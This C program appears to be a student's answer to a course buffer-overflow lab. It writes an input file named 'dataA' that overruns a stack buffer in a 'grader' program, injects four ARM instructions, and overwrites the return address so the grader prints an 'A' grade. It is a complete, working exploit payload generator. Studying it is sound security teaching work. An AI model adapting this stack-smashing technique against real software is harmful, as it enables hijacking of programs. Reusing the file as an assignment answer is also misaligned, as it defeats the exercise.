/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* author: replaced_author                                             */
/*--------------------------------------------------------------------*/

/*
  this program builds a specialized input file named "dataA" that triggers 
  the grader to print an 'A' grade. the underlying tactic is a buffer-overrun
  exploit, which places custom instructions into memory in order to replace
  the existing grade character 'D' with 'A'.

  here’s the general approach:
  - write a chosen username and properly null-terminate it.
  - pad the output with a number of zero bytes to overflow stack memory so 
    that our malicious instructions land exactly where desired.
  - generate a small sequence of instructions:
       * load 'A' into w0
       * compute the grade variable's address via adr and store that in x1
       * write 'A' into the grade variable using strb
       * branch back to the normal print grade location
  - overwrite the function's saved return address so that, upon returning, 
    execution resumes at our inserted instructions rather than where the 
    compiler originally intended.
*/

/*
  runtime specifics:
  - no command-line arguments are interpreted.
  - no input is read from stdin.
  - output is directed solely into "dataA".
  - if an error occurs (like a file not opening), print an error message to stderr.
  - returns 0 on success, 1 on failure.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* constants based on static analysis of grader's memory map */
enum {
    SZ_NAME            = 9,        /* length of "AnishKKat" minus the null terminator */
    CT_PADDING         = 22,       /* number of zero bytes needed to pad stack space */
    ASCII_A_VAL        = 0x41,     /* 'A' in ASCII code */
    ADDR_VAR_GRADE     = 0x420044, /* location of 'grade' in data segment */
    ADDR_PRINT_ROUTINE = 0x40089c, /* address where we jump back to print logic */
    ADDR_NEW_RET       = 0x420078, /* new return address where execution is diverted */
    ADDR_ADR_REF       = 0x42007c  /* reference address for the ADR instruction */
};

int main(void) {
    /* a chosen identity placed into the bss array, mimicking a user input */
    const char *pszInjectedName = "AnishKKat";

    /* file pointer for output */
    FILE *pOutFile = fopen("dataA", "w");
    if (!pOutFile) {
        fprintf(stderr, "error: unable to open dataA for output.\n");
        return 1;
    }

    /* instructions that we will embed into the overflowed buffer */
    unsigned int uiInsLoadA;         /* mov w0, 'A' */
    unsigned int uiInsGetGradeAddr;  /* adr x1, [grade variable address] */
    unsigned int uiInsStoreA;        /* strb w0, [x1] */
    unsigned int uiInsBranchPrint;   /* b [print routine] */

    /* return address override and loop counter */
    unsigned long ulOverrideReturn;
    int iOffset;

    /* first: write the chosen name and append a null terminator */
    fwrite(pszInjectedName, 1, SZ_NAME, pOutFile);
    fputc('\0', pOutFile);

    /* add a series of zero bytes to push our instructions into the right place.
       this ensures that when the function returns, it lands exactly on our code. */
    iOffset = 0;
    while (iOffset < CT_PADDING) {
        fputc('\0', pOutFile);
        iOffset++;
    }

    /* now produce the instructions:
       1) mov w0, 'A' - load 'A' into w0 register
       2) adr x1, ADDR_VAR_GRADE @ ADDR_ADR_REF - get the grade variable address in x1
       3) strb w0, [x1] - store 'A' into the grade memory location
       4) b ADDR_PRINT_ROUTINE - jump back to printing logic, now grade is 'A' */
    uiInsLoadA        = MiniAssembler_mov(0, ASCII_A_VAL);
    uiInsGetGradeAddr = MiniAssembler_adr(1, ADDR_VAR_GRADE, ADDR_ADR_REF);
    uiInsStoreA       = MiniAssembler_strb(0, 1);
    uiInsBranchPrint  = MiniAssembler_b(ADDR_PRINT_ROUTINE, ADDR_ADR_REF + 8);

    /* write instructions in the sequence they must execute */
    fwrite(&uiInsLoadA,        sizeof(unsigned int), 1, pOutFile);
    fwrite(&uiInsGetGradeAddr, sizeof(unsigned int), 1, pOutFile);
    fwrite(&uiInsStoreA,       sizeof(unsigned int), 1, pOutFile);
    fwrite(&uiInsBranchPrint,  sizeof(unsigned int), 1, pOutFile);

    /* overwrite the return pointer so that control flow jumps into our instructions */
    ulOverrideReturn = ADDR_NEW_RET;
    fwrite(&ulOverrideReturn, sizeof(unsigned long), 1, pOutFile);

    fclose(pOutFile);
    return 0;
}